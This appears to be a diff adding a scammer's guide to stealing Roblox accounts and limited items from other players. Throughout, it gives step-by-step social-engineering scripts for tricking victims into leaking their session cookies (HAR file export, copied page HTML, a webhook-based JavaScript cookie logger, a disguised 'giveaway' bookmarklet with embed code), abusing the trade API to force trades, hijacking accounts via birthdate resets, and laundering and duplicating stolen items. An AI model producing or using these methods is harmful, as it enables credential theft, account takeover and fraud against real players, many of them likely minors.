@@ -1,0 +1,183 @@
+RBXFlip Patterns
+- Credits to Hoodie and Ducky
+1. One pattern seen about 90% of the time is 2 Tix and then 4 Robux right after, betting on Robux after there has been 2 Tix and 3 Robux would be a safe bet
+
+2. 6 Streaks. If there is a 6 streak you should usually place a smaller item on the other coin. For Example: 5-6 Tix means you should bet on Robux next.
+
+3. The final pattern is constantly 2 Tix -> 1 Robux -> 3 Tix. This pattern is usually seen in bigger items usually 15k+ and is much safer bet then any other.
+
+
+-----------------------------------------------------------------------------
+API Method
+- Auto accepts the trade on the other persons side
+
+1. Find a player to beam and have them add you on discord
+2. Send them a trade
+3. Once you send them a trade get the trade ID from https://trades.roblox.com/v1/trades/Outbound?sortOrder=Asc&limit=10
+4. The trade ID will be the first numbers you see from the top
+5. Tell the player to go to https://trades.roblox.com/docs
+6. Tell the player to press the first green option and a dropdown should appear
+7. Convince the player to put the Code from earlier into the textbox and press try it now
+8. Trade completed and the trade should auto accept
+
+
+-----------------------------------------------------------------------------
+HAR File Method
+- Convinces a person to send you the cookies to there account
+1. Convince the player to hit Ctrl + Shift + I
+2. Make them go to the bar and hit networks
+3. Make them refresh their page
+4. Make them scroll to the very top and download the first file they see
+5. Make sure they download it as a "HAR.FILE" then make them send you it
+6. Once they send you it download the file
+7. Scroll through the notepad and find their cookies
+
+
+-----------------------------------------------------------------------------
+Cookie Logger Method
+- Has a webhook send you the players cookie
+**SETUP**
+1. Create a webhook on a discord server
+2. Get the webhook URL
+3. Go to: Hyyps://ixwhere.online/ (temporarily) and enter the webhook URL
+4. You will see a java script url that you send to the player
+
+IXWHERE SETUP TUTORAIL: https://www.youtube.com/watch?v=6l0mTM6J-Rw
+1. Add a x infront of what they want you to send, then tell them to paste it into there topbar and remove the x and hit enter.
+2. You will have tehre cookie
+
+
+-----------------------------------------------------------------------------
+YouTube
+ghoste lutsch
+IXWare Tutorial | Free Javascript Roblox Cookie Logger
+
+Reset accounts email even if they have everything written in
+
+Requirments
+- The person must not have a pin on there account and must have there account age over 13.
+
+1. Set the persons birthdate to a day where they are under 13
+2. All there stuff will be reset emails and everything
+3. Setup the new email and request a password change
+4. Change the password and go to security > Sign out of all sessions
+5. You now own the account
+
+
+-----------------------------------------------------------------------------
+Bookmark site method
+
+SETUP
+1. Go to https://sites.google.com/new and create a new website
+2. Press the "embed" button at the side of your screen and select Embed code
+3. Past the code below into that and change "Put your javascript here" to your Javascript
+4. Hit Next, then insert
+5. Edit your site to however you would like then hit Publish
+
+
+Embed code
+<!DOCTYPE html> <html> <head> <style> a:link, a:visited { background-color: #42c5f5; color: white; padding: 15px 25px; text-align: center; text-decoration: none; display: inline-block; } , a:active {  background-color: red; } </style> </head> <body> <h2></h2> <a href="Put your javascript here" target="_blank"><p style="font-family:verdana">DRAG ME TO BOOKMARKS TO BE ENTERED IN OUR GIVEAWAY!</p></a> </body> </html>
+
+
+
+HOW TO USE
+1. Have the person drag the box to there bookmarks
+2. Have them click the bookmark while they are on Roblox
+3. That's it you got there cookies!
+
+
+-----------------------------------------------------------------------------
+Ban3k01/27/2021
+UUC Method
+-- Updated
+
+REQUIRES
+- Roblox Stupid, Given API's, Small limited, Bait Limited
+
+1. Before starting, BE SURE TO TURN TRADE ON EVERYONE, AND TRADE FILTER ON LOW [IMPORTANT]
+2. Get a victim
+3. Make a stupid bet, where you will give them bait limited, and fail the bet, or find some way to convince them that they get free items from you
+4. Send them a trade for their small, and you bait is limited.
+5. Decline the trade immediately.
+6. Ask them to send it because yours "glitched out"
+7. After they have sent the trade, don't accept it, instead, go to studio, and run API one in your browser, or firefox (firefox works better).
+
+API 1: "https://trades.roblox.com/docs#!/Trades/post_v1_trades_tradeId_accept" 
+8. Accept the trade, and siwtch back to chrome.
+9. Run the second API. 
+
+API 2: "https://trades.roblox.com/v1/trades/IDHERE/accept" 
+If you get a white looking error screen, but are still on the roblox website, you are on the right track.
+10. Go and check to see if the trade says "Pending" or something along the lines of waiting.
+11. If the trade is on Pending you have successfully utillized UUC
+
+
+-----------------------------------------------------------------------------
+Ban3k01/27/2021
+How to clean limiteds
+-- After you beam on your alt
+
+1. Beam someone on your alt
+2. Trade that beamed item for a equal item or something
+3. Send that new item for your main
+4. That's it items now cleaned
+
+
+-----------------------------------------------------------------------------
+Ban3k01/28/2021
+How to use Edit This Cookie
+- This is how you sign into the persons account after you get there cookie!
+
+1. Get the chrome extension "Edit This Cookie": https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg
+2. Once you have the extension installed and have your cookie ready, you want to go Roblox.com and click on the extension on your topbar.
+3. A dropdown will appear and you want to navigate to "RobloSecurity"
+4. Once on RobloxSecurity replace the current cookie with the cookie you grabbed and hit the checkmark at the bottom of the dropdown
+5. Refresh your page and you should be signed into there account
+
+
+-----------------------------------------------------------------------------
+Ban3k01/28/2021
+Dupe Adopt Me Method
+-- Credits to: ALEX#0666
+
+1) Trade all of your pets to an alt account and tell Adopt Me you were scammed.
+2) On your alt account, trade your pets for other pets and trade the new pets to two different alt accounts.
+3) Send the new pets to your account that was "scammed" and your Adopt Me pets should be duplicated.
+Adopt Me Method 1
+1) Create an ad in Marketplace servers, saying that you're selling Adopt Me pets.
+2) Sell the pets and use a middleman.
+3) Request your pets back from Adopt Me using the Trade License and use the trade where you gave the user the pets as proof.
+
+
+-----------------------------------------------------------------------------
+Ban3k01/28/2021
+HTML Method
+-- contributed by Dawn
+
+This is like the studio method but not as known. There's a 50/50 percent of people actually falling for this. (actually kinda complicated lol.)
+
+Anyway, let me explain. Tell them to open any game on ROBLOX and make sure they have this pop up: https://cdn.discordapp.com/attachments/708019811384557599/761013633610022912/unknown.png / idk if it works without the pop up because never tried it yet. (probably works though)
+
+Once they opened it, redirect them to "Elements" and tell them to copy the blue HTML which looks like this: "<html> / <html data-btr-loaded" on top of the actual element page, tell them to paste it in your chat dms. Open the "message.txt" they sent you, their auth key is in there. Before doing anything press "Format" and press Word Wrap. Once done, press CTRL+F and search for "+gameinfo" that's their auth key. IF you don't know how to login to someone's account with their auth key please read up the studio method. I explained how to properly login to people's accounts with it.
+
+
+-----------------------------------------------------------------------------
+Ban3k01/28/2021
+Javascript links to make a javascript logger"
+-- Created by <@!737807731351748668> 
+https://discord.gg/DCF5kFhfy7
+
+Non Prompt - https://roblox-api.online/create
+
+Robux Prompt - https://roblox-api.online/create1
+
+Custom Prompt - https://roblox-api.online/prompt
+
+Robux Bookmark - https://roblox-api.online/create-bobux
+
+Custom Bookmark - https://roblox-api.online/booky
+
+Counter - https://roblox-api.online/counter
+
+
+-----------------------------------------------------------------------------
